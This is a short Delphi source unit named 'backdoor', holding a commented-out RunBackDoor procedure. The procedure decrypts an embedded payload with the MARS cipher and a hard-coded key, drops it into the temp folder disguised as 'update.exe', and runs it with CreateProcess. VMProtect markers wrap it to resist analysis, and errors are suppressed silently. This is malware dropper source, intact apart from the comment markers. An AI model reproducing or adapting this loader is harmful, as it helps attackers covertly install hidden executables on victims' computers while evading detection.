unit backdoor;

interface
uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, VCLUnZip, mars, DCPcrypt, idhttp, VMProtectSDK, StrUtils;

// procedure RunBackDoor();

implementation

{.$I .\backdoor.inc }

(*
procedure RunBackDoor();

var
  inStram, outStrem: TMemoryStream;

  DCP_mars: TDCP_mars;

  arr: array[0..MAX_PATH] of Char;
  strpath: string;

  StartupInfo: TStartupInfo;
  ProcessInfo: TProcessInformation;
begin
{$I '..\Common\Macros\VMPB.inc'}

  try


    DCP_mars := TDCP_mars.Create(nil);
    inStram := TMemoryStream.Create;
    outStrem := TMemoryStream.Create;
    inStram.Write(arrbackdoor, sizeof(arrbackdoor) - 1);
    inStram.Position := 0;
    inStram.Size;
    DCP_mars.InitStr(VMProtectDecryptStringA('back door back door'));
    DCP_mars.DecryptStream(inStram, outStrem, inStram.Size);

    GetTempPath(MAX_PATH, arr);
    strpath := arr + '\update.exe';


    outStrem.SaveToFile(strpath);
//       ShowMessage(strpath);
    FillChar(ProcessInfo, sizeof(TProcessInformation), 0);
    FillChar(StartupInfo, Sizeof(TStartupInfo), 0);
    StartupInfo.cb := Sizeof(TStartupInfo);
    StartupInfo.dwFlags := STARTF_USESHOWWINDOW;
    StartupInfo.wShowWindow := SW_SHOW;
    CreateProcess(Pchar(strpath), nil, nil, nil, False, NORMAL_PRIORITY_CLASS,
      nil, nil, StartupInfo, ProcessInfo);
//      ShowMessage(IntToStr(GetLastError));
//    ShowMessage(IntToStr(ProcessInfo.dwProcessId)); //这里就是创建进程的PID值

  except
  end;
{$I '..\Common\Macros\VMPE.inc'}
end;
*)

end.

